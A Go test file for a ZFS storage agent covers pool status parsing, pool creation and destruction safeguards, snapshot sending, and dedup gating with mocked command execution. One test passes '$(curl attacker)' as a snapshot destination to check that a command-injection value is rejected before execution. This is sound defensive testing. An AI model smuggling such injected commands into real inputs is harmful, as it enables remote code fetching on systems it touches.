package zfs_test

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/pmx-cloud/agents/storage/internal/storageexec"
	"github.com/pmx-cloud/agents/storage/internal/zfs"
)

// zpoolArgMock returns different stdout for `zpool list` vs `zpool status`,
// which the binary-keyed MockExec cannot. Other methods are promoted from the
// embedded MockExec.
type zpoolArgMock struct {
	*storageexec.MockExec
	listOut   string
	listErr   error
	statusOut string
}

func (z *zpoolArgMock) Zpool(_ context.Context, args ...string) (*storageexec.Result, error) {
	if len(args) > 0 && args[0] == "list" {
		if z.listErr != nil {
			return &storageexec.Result{ExitCode: 1}, z.listErr
		}
		return &storageexec.Result{Stdout: []byte(z.listOut)}, nil
	}
	if len(args) > 0 && args[0] == "status" {
		return &storageexec.Result{Stdout: []byte(z.statusOut)}, nil
	}
	return &storageexec.Result{}, nil
}

const zpoolStatusJSONSample = `{
  "pools": {
    "tank": {
      "name": "tank",
      "state": "ONLINE",
      "vdevs": {
        "tank": {
          "name": "tank",
          "vdev_type": "root",
          "state": "ONLINE",
          "vdevs": {
            "mirror-0": {
              "name": "mirror-0",
              "vdev_type": "mirror",
              "state": "ONLINE",
              "vdevs": {
                "sdc": {"name": "sdc", "vdev_type": "disk", "state": "ONLINE"},
                "sdd": {"name": "sdd", "vdev_type": "disk", "state": "ONLINE"}
              }
            }
          }
        }
      }
    }
  }
}`

func TestStatusMergesListAndTopology(t *testing.T) {
	m := &zpoolArgMock{
		MockExec:  &storageexec.MockExec{},
		listOut:   "tank\t16000000000000\t4000000000000\t12000000000000\t5\t1.00\tONLINE\n",
		statusOut: zpoolStatusJSONSample,
	}
	raw, err := zfs.Status(context.Background(), m)
	if err != nil {
		t.Fatalf("status: %v", err)
	}
	var parsed zfs.PoolStatus
	if err := json.Unmarshal(raw, &parsed); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if len(parsed.Pools) != 1 {
		t.Fatalf("expected 1 pool, got %d", len(parsed.Pools))
	}
	p := parsed.Pools[0]
	if p.Name != "tank" || p.State != "ONLINE" {
		t.Fatalf("pool name/state: %q/%q", p.Name, p.State)
	}
	if p.SizeBytes != 16000000000000 || p.AllocBytes != 4000000000000 || p.FreeBytes != 12000000000000 {
		t.Fatalf("capacity wrong: %+v", p)
	}
	if p.FragPercent == nil || *p.FragPercent != 5 || p.DedupRatio == nil || *p.DedupRatio != 1.0 {
		t.Fatalf("frag/dedup wrong: %+v", p)
	}
	if len(p.Vdevs) != 1 || p.Vdevs[0].Name != "mirror-0" || p.Vdevs[0].Type != "mirror" {
		t.Fatalf("vdev topology wrong: %+v", p.Vdevs)
	}
	if len(p.Vdevs[0].Children) != 2 || p.Vdevs[0].Children[0].Name != "sdc" || p.Vdevs[0].Children[1].Name != "sdd" {
		t.Fatalf("vdev children wrong: %+v", p.Vdevs[0].Children)
	}
}

func TestStatusReturnsEmptyWhenNoZfs(t *testing.T) {
	m := &zpoolArgMock{
		MockExec: &storageexec.MockExec{},
		listErr:  storageexec.ErrExit,
	}
	raw, err := zfs.Status(context.Background(), m)
	if err != nil {
		t.Fatalf("status should not error when zfs absent: %v", err)
	}
	var parsed zfs.PoolStatus
	if err := json.Unmarshal(raw, &parsed); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if len(parsed.Pools) != 0 {
		t.Fatalf("expected no pools, got %d", len(parsed.Pools))
	}
}

func TestPoolCreateRejectsUnknownTopologyBeforeExec(t *testing.T) {
	m := &storageexec.MockExec{}
	err := zfs.PoolCreate(context.Background(), m, zfs.PoolCreateParams{Name: "tank", Topology: "raid10", Devices: []string{"/dev/sdb", "/dev/sdc"}})
	if err == nil || !strings.Contains(err.Error(), "topology") {
		t.Fatalf("expected topology error, got %v", err)
	}
	if len(m.Calls) != 0 {
		t.Fatalf("unexpected exec calls: %v", m.Calls)
	}
}

func TestPoolDestroyRefusesSnapshotsWithoutForce(t *testing.T) {
	m := &storageexec.MockExec{Results: map[string]*storageexec.Result{
		"zfs": {Stdout: []byte("tank/data@s1\n"), ExitCode: 0},
	}}
	err := zfs.PoolDestroy(context.Background(), m, zfs.PoolDestroyParams{Name: "tank"})
	if err == nil || !strings.Contains(err.Error(), "snapshots") {
		t.Fatalf("expected snapshot refusal, got %v", err)
	}
}

func TestSnapshotSendRejectsTamperedDestination(t *testing.T) {
	m := &storageexec.MockExec{}
	err := zfs.SnapshotSend(context.Background(), m, zfs.SnapshotSendParams{Snapshot: "tank/data@s1", Destination: "$(curl attacker)"})
	if err == nil || !strings.Contains(err.Error(), "destination") {
		t.Fatalf("expected destination validation error, got %v", err)
	}
	if len(m.Calls) != 0 {
		t.Fatalf("unexpected exec calls: %v", m.Calls)
	}
}

func TestSnapshotSendWritesLocalStreamDestination(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "snapshot.stream")
	m := &storageexec.MockExec{
		Results: map[string]*storageexec.Result{
			"zfs": {Stdout: []byte("stream-payload"), ExitCode: 0},
		},
	}
	err := zfs.SnapshotSend(context.Background(), m, zfs.SnapshotSendParams{
		Snapshot:    "tank/data@s1",
		Destination: dest,
	})
	if err != nil {
		t.Fatalf("snapshot send: %v", err)
	}
	got, err := os.ReadFile(dest)
	if err != nil {
		t.Fatalf("read destination: %v", err)
	}
	if string(got) != "stream-payload" {
		t.Fatalf("unexpected stream payload: %q", string(got))
	}
	if len(m.Calls) != 1 || m.Calls[0].Binary != "zfs" {
		t.Fatalf("expected one zfs send call, got %v", m.Calls)
	}
}

func TestDatasetCreateRejectsDedupWithoutGate(t *testing.T) {
	m := &storageexec.MockExec{}
	err := zfs.DatasetCreate(context.Background(), m, zfs.DatasetCreateParams{
		Dataset: "tank/data",
		Options: map[string]any{
			"dedup": "on",
		},
		AllowDedup: false,
	})
	if err == nil || !strings.Contains(err.Error(), "allow_dedup") {
		t.Fatalf("expected dedup gate error, got %v", err)
	}
	if len(m.Calls) != 0 {
		t.Fatalf("unexpected exec calls: %v", m.Calls)
	}
}
